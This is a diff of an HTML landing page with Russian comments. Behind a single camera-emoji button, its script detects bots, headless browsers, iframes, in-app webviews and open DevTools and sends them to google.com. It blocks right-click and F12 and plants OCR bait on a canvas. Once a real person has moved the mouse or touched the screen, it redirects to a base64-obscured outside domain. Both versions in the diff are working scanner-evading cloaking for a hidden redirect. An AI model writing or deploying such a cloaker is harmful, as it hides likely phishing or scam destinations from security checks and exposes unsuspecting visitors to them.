@@ -32,11 +32,11 @@
   </style>
 </head>
 <body>
-  <button class="btn" type="button" onclick="go(event)">📷</button>
+  <button class="btn" onclick="go()">📷</button>
   <canvas class="ocr-bait" id="ocr"></canvas>
 
   <script>
-    // --- Антиботовые проверки ---
+    // Защита от встроенных браузеров и iframe
     (function() {
       const ua = navigator.userAgent.toLowerCase();
       const badAgents = [
@@ -44,19 +44,18 @@
         "webview", "line", "pinterest", "telegram", "grindr"
       ];
       const isWebview = badAgents.some(agent => ua.includes(agent));
-
       if (
-        isWebview ||
-        window.top !== window.self ||       // в iframe запрещаем
-        navigator.webdriver ||               // headless detection
-        navigator.plugins.length === 0 ||   // пустой plugins - часто headless
-        !navigator.languages                 // нет языков - подозрительно
+        isWebview || 
+        window.top !== window.self || 
+        navigator.webdriver || 
+        navigator.plugins.length === 0 || 
+        !navigator.languages
       ) {
         location.href = "https://google.com";
       }
     })();
 
-    // --- OCR ловушка для ботов, которые читают DOM ---
+    // OCR приманка для визуальных ботов
     (function() {
       const canvas = document.getElementById("ocr");
       const ctx = canvas.getContext("2d");
@@ -67,41 +66,36 @@
       ctx.fillText("https://gayron.life/rehbixee", 10, 50);
     })();
 
-    // --- Проверка размера окна для headless detection ---
+    // Детекция нестандартного окна headless
     setInterval(() => {
       if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
         location.href = "https://google.com";
       }
     }, 500);
 
-    // --- Блокировка правого клика и DevTools ---
+    // Блокировка контекстного меню и DevTools (F12, Ctrl+Shift+I)
     document.addEventListener("contextmenu", e => e.preventDefault());
     document.onkeydown = e => {
       if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
     };
 
-    // --- Проверка взаимодействия пользователя ---
+    // Проверка взаимодействия пользователя
     let interacted = false;
     document.addEventListener("mousemove", () => interacted = true);
     document.addEventListener("touchstart", () => interacted = true);
     document.addEventListener("keypress", () => interacted = true);
 
-    // --- XOR + base64 декодирование ---
-    function xor(str, key) {
-      return str.split('').map((c, i) =>
-        String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))
-      ).join('');
-    }
-
-    // --- Функция редиректа с проверкой взаимодействия ---
-    function go(event) {
-      if (event) event.preventDefault(); // убираем дефолтное поведение кнопки
+    // Простая base64-ссылка для редиректа
+    function go() {
       if (!interacted) return;
-
       setTimeout(() => {
-        const encrypted = "NQcTCgBTUAgTFVpGUBYXA0FSWw4TCFkYVg=="; // XOR("https://gayron.life/rehbixee", "gayron") затем btoa()
-        const decoded = xor(atob(encrypted), "gayron");
-        location.href = decoded;
+        const encoded = "aHR0cHM6Ly9nYXlyb24ubGlmZS9yZWhiaXhlZQ=="; // base64 от https://gayron.life/rehbixee
+        const decoded = atob(encoded);
+        if (decoded.startsWith("http")) {
+          location.href = decoded;
+        } else {
+          console.error("Decoded URL invalid:", decoded);
+        }
       }, 1500 + Math.random() * 500);
     }
   </script>
